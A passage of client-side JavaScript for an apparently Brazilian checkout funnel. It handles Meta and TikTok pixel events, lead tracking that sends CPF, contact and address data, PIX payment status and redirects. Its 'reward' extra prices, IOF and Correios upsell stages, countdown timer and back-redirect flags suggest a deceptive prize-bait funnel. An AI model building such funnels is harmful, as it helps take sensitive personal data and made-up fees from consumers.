    return `pv_${pageToken}_${sessionToken}`;
}

function buildAddPaymentInfoEventId(sessionId = '') {
    const token = sanitizeEventIdToken(sessionId || getLeadSessionId());
    return `api_${token}`;
}

function buildInitiateCheckoutEventId(sessionId = '') {
    const token = sanitizeEventIdToken(sessionId || getLeadSessionId());
    return `ic_${token}`;
}

function buildViewContentEventId(sessionId = '') {
    const token = sanitizeEventIdToken(sessionId || getLeadSessionId());
    return `vc_${token}`;
}

function buildPurchaseEventId(payload = {}) {
    const txid = String(payload?.pix?.idTransaction || payload?.pix?.idtransaction || payload?.pix?.txid || '').trim();
    if (txid) return txid;
    const sessionId = String(payload?.sessionId || getLeadSessionId()).trim();
    if (sessionId) return sessionId;
    const token = sanitizeEventIdToken(getLeadSessionId());
    return `purchase_${token}`;
}

function shouldDedupePixelByEventId(eventId = '') {
    return !!String(eventId || '').trim();
}

function buildRuntimePixelEventNonce() {
    return `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`.replace(/[^a-z0-9]/g, '');
}

function getMetaRuntimeEventId(kind = '', page = '') {
    const pageToken = sanitizeEventIdToken(page || document.body?.dataset?.page || 'page', 24);
    const key = `${String(kind || '').trim()}:${pageToken}`;
    if (!state.metaRuntimeEventIds[key]) {
        const sessionToken = sanitizeEventIdToken(getLeadSessionId(), 18);
        state.metaRuntimeEventIds[key] = `${String(kind || 'evt').trim()}_${pageToken}_${sessionToken}_${buildRuntimePixelEventNonce()}`.slice(0, 120);
    }
    return state.metaRuntimeEventIds[key];
}

function getCurrentPageViewEventId(page = '') {
    return getMetaRuntimeEventId('pv', page || document.body?.dataset?.page || 'page');
}

function getCurrentInitiateCheckoutEventId() {
    return getMetaRuntimeEventId('ic', 'pix');
}

function getCurrentViewContentEventId() {
    return getMetaRuntimeEventId('vc', 'processing');
}

function loadPixelEventDedupe() {
    try {
        const raw = sessionStorage.getItem(STORAGE_KEYS.pixelEventDedupe);
        if (!raw) return {};
        const parsed = JSON.parse(raw);
        if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) return {};
        return parsed;
    } catch (_error) {
        return {};
    }
}

function savePixelEventDedupe(map = {}) {
    try {
        const entries = Object.entries(map || {});
        const capped = entries
            .sort((a, b) => Number(b[1] || 0) - Number(a[1] || 0))
            .slice(0, 200);
        const compact = {};
        capped.forEach(([key, value]) => {
            compact[key] = Number(value || 0) || Date.now();
        });
        sessionStorage.setItem(STORAGE_KEYS.pixelEventDedupe, JSON.stringify(compact));
    } catch (_error) {}
}

function hasSentPixelEvent(provider = '', eventName = '', eventId = '') {
    if (!provider || !eventName || !eventId) return false;
    const key = `${String(provider || '').trim()}:${String(eventName || '').trim()}:${String(eventId || '').trim()}`;
    const map = loadPixelEventDedupe();
    return Boolean(map[key]);
}

function markPixelEventSent(provider = '', eventName = '', eventId = '') {
    if (!provider || !eventName || !eventId) return;
    const key = `${String(provider || '').trim()}:${String(eventName || '').trim()}:${String(eventId || '').trim()}`;
    const map = loadPixelEventDedupe();
    map[key] = Date.now();
    savePixelEventDedupe(map);
}

function isBrowserPixelEnabled(config = {}) {
    return Boolean(config?.enabled && String(config?.id || '').trim());
}

function getMetaPixelTargets(config = {}) {
    const primaryId = String(config?.id || '').trim();
    const backupId = String(config?.backupId || '').trim();
    const targets = [];
    if (primaryId) targets.push(primaryId);
    if (backupId && backupId !== primaryId) targets.push(backupId);
    return targets;
}

function resolveTrackedPixelProviders(utm = {}, options = {}) {
    const metaPixel = options?.metaConfig || state.pixelConfig;
    const tiktokPixel = options?.tiktokConfig || state.tiktokPixelConfig;
    const hasMeta = isBrowserPixelEnabled(metaPixel);
    const hasTikTok = isBrowserPixelEnabled(tiktokPixel);
    const sourcePlatform = inferTrafficPlatform({
        ...(utm || {}),
        referrer: utm?.referrer || document.referrer || ''
    });

    if (hasMeta && hasTikTok) {
        return {
            sourcePlatform,
            meta: sourcePlatform === 'meta',
            tiktok: sourcePlatform === 'tiktok'
        };
    }
    if (hasMeta) {
        return {
            sourcePlatform,
            meta: sourcePlatform !== 'tiktok',
            tiktok: false
        };
    }
    if (hasTikTok) {
        return {
            sourcePlatform,
            meta: false,
            tiktok: sourcePlatform !== 'meta'
        };
    }
    return {
        sourcePlatform,
        meta: false,
        tiktok: false
    };
}

function buildPixelValueData(payload = {}) {
    const explicitValue = Number(payload?.amount);
    const shippingValue = Number(payload?.shipping?.price || 0);
    const bumpValue = Number(payload?.bump?.price || 0);
    const rewardValue = Number(
        payload?.reward?.checkoutExtraPrice ||
        payload?.reward?.extraPrice ||
        payload?.pix?.rewardExtraPrice ||
        0
    );
    const computedValue = Number.isFinite(shippingValue + bumpValue + rewardValue)
        ? Number((shippingValue + bumpValue + rewardValue).toFixed(2))
        : 0;
    const totalValue = Number.isFinite(explicitValue) && explicitValue > 0 ? explicitValue : computedValue;
    const contentName = payload?.isUpsell
        ? String(payload?.upsell?.title || payload?.shipping?.name || payload?.reward?.name || '').trim()
        : String(payload?.reward?.name || payload?.shipping?.name || payload?.upsell?.title || '').trim();
    return {
        totalValue,
        contentName,
        contentCategory: payload?.isUpsell ? 'upsell' : 'checkout'
    };
}

async function initMarketing() {
    const site = await ensureSiteConfig();
    const pixel = site?.pixel || state.pixelConfig || null;
    const tiktokPixel = site?.tiktokPixel || state.tiktokPixelConfig || null;
    const routing = resolveTrackedPixelProviders(getUtmData(), {
        metaConfig: pixel,
        tiktokConfig: tiktokPixel
    });
    const metaEnabled = isBrowserPixelEnabled(pixel);
    const tiktokEnabled = isBrowserPixelEnabled(tiktokPixel);
    const hasResolvedSource = !!String(routing?.sourcePlatform || '').trim();
    const shouldSendMetaPageView = metaEnabled && pixel.events?.page_view !== false && (routing.meta || !hasResolvedSource);
    const shouldSendTikTokPageView = tiktokEnabled && tiktokPixel.events?.page_view !== false && (routing.tiktok || !hasResolvedSource);
    const page = String(document.body?.dataset?.page || '').trim();
    const pixData = loadPix() || {};
    const pixAmount = Number(pixData?.amount || 0);

    if (metaEnabled) {
        getMetaPixelTargets(pixel).forEach((targetId) => loadFacebookPixel(targetId));
    }
    if (tiktokEnabled) {
        loadTikTokPixel(tiktokPixel.id, {
            firePageView: shouldSendTikTokPageView
        });
    }

    if (shouldSendMetaPageView) {
        fireMetaPixelEvent('PageView', {}, {
            eventID: getCurrentPageViewEventId(page)
        });
    }

    if (routing.meta && metaEnabled) {
        if (page === 'pix' && pixel.events?.checkout !== false) {
            fireMetaPixelEvent('InitiateCheckout', {
                currency: 'BRL',
                ...(Number.isFinite(pixAmount) && pixAmount > 0 ? { value: Number(pixAmount.toFixed(2)) } : {})
            }, {
                eventID: getCurrentInitiateCheckoutEventId()
            });
        }

        // Ensure /processando always sends ViewContent after pixel config is ready.
        if (page === 'processing' && pixel.events?.quiz_view !== false) {
            fireMetaPixelEvent('ViewContent', {
                content_name: 'processando'
            }, {
                eventID: getCurrentViewContentEventId()
            });
        }
    }

    if (routing.tiktok && tiktokEnabled) {
        if (page === 'pix' && tiktokPixel.events?.checkout !== false) {
            fireTikTokPixelEvent('InitiateCheckout', {
                content_type: 'product',
                currency: 'BRL',
                ...(Number.isFinite(pixAmount) && pixAmount > 0 ? { value: Number(pixAmount.toFixed(2)) } : {})
            });
        }

        if (page === 'processing' && tiktokPixel.events?.quiz_view !== false) {
            fireTikTokPixelEvent('ViewContent', {
                content_type: 'product',
                description: 'processando'
            });
        }
    }
}

function fireMetaPixelEvent(eventName, data = {}, options = {}) {
    const pixelTargets = getMetaPixelTargets(state.pixelConfig);
    if (!pixelTargets.length) return;
    pixelTargets.forEach((pixelId) => loadFacebookPixel(pixelId));
    if (!window.fbq) return;
    const hasOptions = options && Object.keys(options).length > 0;
    const eventId = String(options?.eventID || options?.eventId || '').trim();
    const shouldDedupe = shouldDedupePixelByEventId(eventId);
    for (const pixelId of pixelTargets) {
        if (shouldDedupe && hasSentPixelEvent(`meta:${pixelId}`, eventName, eventId)) {
            continue;
        }
        let sent = false;
        try {
            if (hasOptions) {
                window.fbq('trackSingle', pixelId, eventName, data, options);
            } else {
                window.fbq('trackSingle', pixelId, eventName, data);
            }
            sent = true;
        } catch (_error) {
            try {
                if (hasOptions) {
                    window.fbq('trackSingle', pixelId, eventName, data, options);
                } else {
                    window.fbq('trackSingle', pixelId, eventName, data);
                }
                sent = true;
            } catch (_error2) {}
        }
        if (sent && shouldDedupe) {
            markPixelEventSent(`meta:${pixelId}`, eventName, eventId);
        }
    }
}

function firePixelEvent(eventName, data = {}, options = {}) {
    fireMetaPixelEvent(eventName, data, options);
}

function fireTikTokPixelEvent(eventName, data = {}, options = {}) {
    const pixelId = String(state.tiktokPixelConfig?.id || '').trim();
    if (!pixelId) return;
    loadTikTokPixel(pixelId);
    const tracker = getTikTokTracker(pixelId);
    if (!tracker || typeof tracker.track !== 'function') return;
    const hasOptions = options && Object.keys(options).length > 0;
    const eventId = String(options?.event_id || options?.eventId || '').trim();
    const shouldDedupe = shouldDedupePixelByEventId(eventId);
    if (shouldDedupe && hasSentPixelEvent('tiktok', eventName, eventId)) {
        return;
    }

    try {
        if (hasOptions) {
            tracker.track(eventName, data, options);
        } else {
            tracker.track(eventName, data);
        }
        if (shouldDedupe) {
            markPixelEventSent('tiktok', eventName, eventId);
        }
    } catch (_error) {}
}

function maybeTrackMetaPixel(eventName, payload = {}) {
    const pixel = state.pixelConfig;
    if (!pixel || !pixel.enabled || !pixel.id) return;
    const { totalValue, contentName, contentCategory } = buildPixelValueData(payload);
    if (eventName === 'personal_submitted' && pixel.events?.lead !== false) {
        const leadEventId = String(payload?.eventId || buildLeadEventId(payload?.sessionId)).trim();
        payload.eventId = leadEventId;
        fireMetaPixelEvent('Lead', {}, { eventID: leadEventId });
    }

    if (eventName === 'checkout_view' && pixel.events?.checkout !== false) {
        const addPaymentInfoEventId = String(
            payload?.addPaymentInfoEventId || payload?.eventId || buildAddPaymentInfoEventId(payload?.sessionId)
        ).trim();
        payload.addPaymentInfoEventId = addPaymentInfoEventId;
        fireMetaPixelEvent('AddPaymentInfo', {
            currency: 'BRL',
            ...(totalValue > 0 ? { value: totalValue } : {})
        }, { eventID: addPaymentInfoEventId });
    }

    if (eventName === 'pix_paid' && pixel.events?.purchase !== false) {
        const purchaseEventId = String(payload?.purchaseEventId || buildPurchaseEventId(payload)).trim();
        payload.purchaseEventId = purchaseEventId;
        fireMetaPixelEvent('Purchase', {
            currency: 'BRL',
            ...(totalValue > 0 ? { value: totalValue } : {}),
            content_name: contentName,
            content_category: contentCategory
        }, { eventID: purchaseEventId });
    }
}

function maybeTrackTikTokPixel(eventName, payload = {}) {
    const pixel = state.tiktokPixelConfig;
    if (!pixel || !pixel.enabled || !pixel.id) return;
    const { totalValue, contentName, contentCategory } = buildPixelValueData(payload);

    if (eventName === 'personal_submitted' && pixel.events?.lead !== false) {
        const leadEventId = String(payload?.eventId || buildLeadEventId(payload?.sessionId)).trim();
        payload.eventId = leadEventId;
        fireTikTokPixelEvent('SubmitForm', {}, { event_id: leadEventId });
    }

    if (eventName === 'checkout_view' && pixel.events?.checkout !== false) {
        const addPaymentInfoEventId = String(
            payload?.addPaymentInfoEventId || payload?.eventId || buildAddPaymentInfoEventId(payload?.sessionId)
        ).trim();
        payload.addPaymentInfoEventId = addPaymentInfoEventId;
        fireTikTokPixelEvent('AddPaymentInfo', {
            content_type: 'product',
            ...(contentName ? { description: contentName } : {}),
            currency: 'BRL',
            ...(totalValue > 0 ? { value: totalValue } : {})
        }, { event_id: addPaymentInfoEventId });
    }

    if (eventName === 'pix_paid' && pixel.events?.purchase !== false) {
        const purchaseEventId = String(payload?.purchaseEventId || buildPurchaseEventId(payload)).trim();
        payload.purchaseEventId = purchaseEventId;
        fireTikTokPixelEvent('Purchase', {
            content_type: 'product',
            ...(contentName ? { description: contentName } : {}),
            currency: 'BRL',
            ...(totalValue > 0 ? { value: totalValue } : {}),
            content_category: contentCategory
        }, { event_id: purchaseEventId });
    }
}

function maybeTrackPixels(eventName, payload = {}) {
    const routing = resolveTrackedPixelProviders(payload?.utm || getUtmData());
    if (routing.meta) {
        maybeTrackMetaPixel(eventName, payload);
    }
    if (routing.tiktok) {
        maybeTrackTikTokPixel(eventName, payload);
    }
}

function trackLead(eventName, extra = {}) {
    ensureApiSession().catch(() => null);
    const utm = getUtmData();
    const pixelBrowser = getPixelBrowserContext(utm);

    const payload = {
        sessionId: getLeadSessionId(),
        event: eventName,
        stage: extra.stage || getStage() || '',
        page: document.body.dataset.page || '',
        sourceUrl: window.location.href,
        utm,
        fbclid: pixelBrowser.fbclid || undefined,
        fbp: pixelBrowser.fbp || undefined,
        fbc: pixelBrowser.fbc || undefined,
        ttclid: String(utm?.ttclid || '').trim() || undefined,
        personal: extra.personal || loadPersonal() || {},
        address: extra.address || loadAddress() || {},
        extra: extra.extra || loadAddressExtra() || {},
        shipping: extra.shipping || loadShipping() || {},
        reward: extra.reward || loadRewardSelection() || {},
        bump: extra.bump || loadBump() || {},
        pix: extra.pix || loadPix() || {},
        quiz: extra.quiz || {},
        amount: Number.isFinite(Number(extra.amount)) ? Number(extra.amount) : undefined,
        isUpsell: extra.isUpsell === true,
        eventId: extra.eventId || undefined,
        addPaymentInfoEventId: extra.addPaymentInfoEventId || undefined,
        purchaseEventId: extra.purchaseEventId || undefined,
        viewContentEventId: extra.viewContentEventId || (eventName === 'processing_view' ? getCurrentViewContentEventId() : undefined),
        initiateCheckoutEventId: extra.initiateCheckoutEventId || (eventName === 'pix_view' ? getCurrentInitiateCheckoutEventId() : undefined)
    };

    maybeTrackPixels(eventName, payload);

    try {
        const body = JSON.stringify(payload);
        if (navigator.sendBeacon) {
            const blob = new Blob([body], { type: 'application/json' });
            navigator.sendBeacon('/api/lead/track', blob);
            return;
        }
        fetch('/api/lead/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body,
            keepalive: true
        }).catch(() => null);
    } catch (_error) {
        // Tracking must never break the main flow.
    }
}

function setHidden(element, shouldHide) {
    if (!element) return;
    element.classList.toggle('hidden', shouldHide);
    element.setAttribute('aria-hidden', shouldHide ? 'true' : 'false');
}

function showInlineError(container, message) {
    if (!container) {
        showToast(message, 'error');
        return;
    }
    container.textContent = message;
    container.classList.remove('hidden');
}

function clearInlineError(container) {
    if (!container) return;
    container.textContent = '';
    container.classList.add('hidden');
}

function resetCepResults(errorBox, addressResult, freightBox, btnBuscar, loadingRow) {
    clearInlineError(errorBox);
    setHidden(addressResult, true);
    setHidden(freightBox, true);
    setHidden(loadingRow, true);
    btnBuscar?.classList.remove('hidden');
}

function focusFirstControl(container) {
    if (!container) return;
    const focusTarget = container.querySelector('input, button, select, textarea');
    if (focusTarget) {
        setTimeout(() => focusTarget.focus(), 50);
    }
}

function startTimer(duration, display) {
    if (!display) return;
    if (state.timerId) clearInterval(state.timerId);
    let timer = duration;

    state.timerId = setInterval(() => {
        const minutes = String(Math.floor(timer / 60)).padStart(2, '0');
        const seconds = String(timer % 60).padStart(2, '0');
        display.textContent = `${minutes}:${seconds}`;

        if (timer > 0) {
            timer -= 1;
        }
    }, 1000);
}

function showToast(message, type = 'info') {
    if (!dom.toast) {
        alert(message);
        return;
    }

    dom.toast.textContent = message;
    dom.toast.classList.remove('hidden', 'toast--success', 'toast--error', 'toast--info');

    if (type === 'success') dom.toast.classList.add('toast--success');
    if (type === 'error') dom.toast.classList.add('toast--error');

    requestAnimationFrame(() => {
        dom.toast.classList.add('toast--show');
    });

    if (state.toastTimeout) clearTimeout(state.toastTimeout);
    state.toastTimeout = setTimeout(() => {
        dom.toast.classList.remove('toast--show');
        setTimeout(() => dom.toast.classList.add('hidden'), 200);
    }, 2800);
}

function savePersonal(data) {
    localStorage.setItem(STORAGE_KEYS.personal, JSON.stringify(data));
}

function loadPersonal() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.personal);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function saveAddress(data) {
    localStorage.setItem(STORAGE_KEYS.address, JSON.stringify(data));
}

function loadAddress() {
    try {
        const raw = localStorage.getItem(STORAGE_KEYS.address);
        return raw ? JSON.parse(raw) : null;
    } catch (error) {
        return null;
    }
}

function saveQuizComplete() {
    localStorage.setItem(STORAGE_KEYS.quizComplete, 'true');
}

function setStage(stage) {
    if (!stage) return;
    localStorage.setItem(STORAGE_KEYS.stage, stage);
}

function getStage() {
    return localStorage.getItem(STORAGE_KEYS.stage) || '';
}

function resetFlow() {
    localStorage.removeItem(STORAGE_KEYS.personal);
    localStorage.removeItem(STORAGE_KEYS.address);
    localStorage.removeItem(STORAGE_KEYS.quizComplete);
    localStorage.removeItem(STORAGE_KEYS.stage);
    localStorage.removeItem(STORAGE_KEYS.shipping);
    localStorage.removeItem(STORAGE_KEYS.reward);
    localStorage.removeItem(STORAGE_KEYS.addressExtra);
    localStorage.removeItem(STORAGE_KEYS.pix);
    localStorage.removeItem(STORAGE_KEYS.bump);
    localStorage.removeItem(STORAGE_KEYS.vslCompleted);
    sessionStorage.removeItem(STORAGE_KEYS.stock);
    sessionStorage.removeItem(STORAGE_KEYS.returnTo);
    sessionStorage.removeItem(STORAGE_KEYS.directCheckout);
    clearCoupon();
}

function markVslCompleted() {
    localStorage.setItem(STORAGE_KEYS.vslCompleted, '1');
}

function isVslCompleted() {
    return localStorage.getItem(STORAGE_KEYS.vslCompleted) === '1';
}

function normalizePixStatusKey(value) {
    return String(value || '')
        .trim()
        .toLowerCase()
        .replace(/\s+/g, '_')
        .replace(/-+/g, '_')
        .replace(/_+/g, '_')
        .replace(/^_+|_+$/g, '');
}

function escapePixStatusRegExp(value) {
    return String(value || '').replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function hasPixStatusToken(status, tokens = []) {
    const normalized = normalizePixStatusKey(status);
    if (!normalized) return false;
    return tokens.some((token) => {
        const clean = normalizePixStatusKey(token);
        if (!clean) return false;
        return new RegExp(`(?:^|_)${escapePixStatusRegExp(clean)}(?:$|_)`).test(normalized);
    });
}

function isPixPaid(pix) {
    if (!pix || typeof pix !== 'object') return false;
    if (pix.upsellPaid === true) return true;
    const status = pix.status || pix.statusRaw || '';
    if (hasPixStatusToken(status, ['unpaid', 'not_paid', 'nao_pago', 'nao_aprovado', 'unauthorized', 'unconfirmed'])) return false;
    if (hasPixStatusToken(status, ['refund', 'refunded', 'estorno', 'reembolsado', 'refused', 'recusado', 'failed', 'failure', 'cancel', 'cancelled', 'canceled', 'expired', 'expirado', 'chargeback', 'chargedback', 'declined', 'rejected'])) return false;
    return hasPixStatusToken(status, ['paid', 'pago', 'authorized', 'approved', 'aprovado', 'confirmed', 'confirmado', 'completed', 'concluido', 'concluida', 'success', 'successful']);
}

function resolveResumeUrl() {
    const stage = getStage();

    if (stage === 'quiz') return 'quiz';
    if (stage === 'personal') return 'dados';
    if (stage === 'cep') return 'endereco';
    if (stage === 'processing') return 'processando';
    if (stage === 'success') return 'sucesso';
    if (stage === 'checkout') return 'checkout';
    if (stage === 'orderbump') return 'orderbump';
    if (stage === 'pix') return 'pix';
    if (stage === 'upsell_iof') return 'upsell-iof';
    if (stage === 'upsell_correios') return 'upsell-correios';
    if (stage === 'upsell') return 'upsell';
    if (stage === 'complete') return 'checkout';
    if (loadPersonal() && !loadAddress()) return 'endereco';
    if (loadPersonal() && loadAddress()) return 'checkout';

    return null;
}

function getReturnTarget() {
    const params = new URLSearchParams(window.location.search);
    const queryReturn = params.get('return');
    if (queryReturn) {
        sessionStorage.setItem(STORAGE_KEYS.returnTo, queryReturn);
        return queryReturn;
    }
    return sessionStorage.getItem(STORAGE_KEYS.returnTo) || '';
}

function isDirectCheckoutMode() {
    const params = new URLSearchParams(window.location.search || '');
    if (params.get('dc') === '1') {
        sessionStorage.setItem(STORAGE_KEYS.directCheckout, '1');
        return true;
    }
    return sessionStorage.getItem(STORAGE_KEYS.directCheckout) === '1';
}

function requirePersonal() {
    if (isDirectCheckoutMode()) return true;
    const personal = loadPersonal();
    if (!personal || !personal.name || !personal.cpf || !personal.birth || !personal.email || !personal.phone) {
        redirect('dados.html');
        return false;
    }
    return true;
}

function requireAddress() {
    if (isDirectCheckoutMode()) return true;
    if (!loadAddress()) {
        redirect('endereco.html');
        return false;
    }
    return true;
}

function appendTrackingParamsToUrl(url) {
    const utm = getUtmData();
    if (!utm || typeof utm !== 'object') return url;

    const pairs = {
        src: utm.src || '',
        sck: utm.sck || '',
        utm_source: utm.utm_source || '',
        utm_medium: utm.utm_medium || '',
        utm_campaign: utm.utm_campaign || utm.campaign || '',
        utm_term: utm.utm_term || utm.adset || '',
        utm_content: utm.utm_content || utm.ad_id || utm.placement || '',
        gclid: utm.gclid || '',
        fbclid: utm.fbclid || '',
        ttclid: utm.ttclid || '',
        ad_platform: utm.ad_platform || ''
    };
    if (!Object.values(pairs).some((value) => String(value || '').trim())) {
        return url;
    }

    try {
        const parsed = new URL(url, window.location.origin);
        Object.entries(pairs).forEach(([key, value]) => {
            const clean = String(value || '').trim();
            if (clean && !parsed.searchParams.has(key)) {
                parsed.searchParams.set(key, clean);
            }
        });
        return `${parsed.pathname}${parsed.search}${parsed.hash}`;
    } catch (_error) {
        return url;
    }
}

function redirect(url) {
    let target = appendTrackingParamsToUrl(toRootRelativePath(url || ''));
    if (!target) return;

    const currentPath = normalizeBackRedirectPath(`${window.location.pathname}${window.location.search || ''}`);
    const targetPath = normalizeBackRedirectPath(target);
    if (targetPath && currentPath && targetPath === currentPath) {
        try {
            const parsed = new URL(target, window.location.origin);
            parsed.searchParams.set('br', String(Date.now()));
            target = `${parsed.pathname}${parsed.search}${parsed.hash}`;
        } catch (_error) {
            target = `${target}${target.includes('?') ? '&' : '?'}br=${Date.now()}`;
        }
    }

    window.__ifbAllowUnload = true;
    window.location.href = target;
}

